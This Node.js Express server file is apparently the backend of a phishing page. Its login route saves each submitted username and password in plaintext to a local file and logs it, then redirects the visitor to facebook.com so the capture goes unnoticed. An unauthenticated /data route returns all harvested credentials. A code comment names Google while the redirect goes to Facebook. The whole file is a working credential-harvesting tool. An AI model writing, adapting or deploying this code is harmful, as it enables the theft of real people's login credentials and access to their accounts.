const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware to parse JSON and URL-encoded bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// File for storing data
const DATA_FILE = './loginData.txt';

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Handle POST request for login
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const loginData = `Username: ${username}\nPassword: ${password}\n`;

    // Append login data to file
    fs.appendFile(DATA_FILE, loginData, (err) => {
        if (err) throw err;
        console.log('Login data saved:\n', loginData.trim());
    });

    // Redirect to Google.com after submitting the form
    res.redirect('http://www.facebook.com');
});

// Route to retrieve all stored login data
app.get('/data', (req, res) => {
    fs.readFile(DATA_FILE, 'utf8', (err, data) => {
        if (err) {
            res.status(500).send('Error reading data.');
        } else {
            res.type('text/plain');
            res.send(data);
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
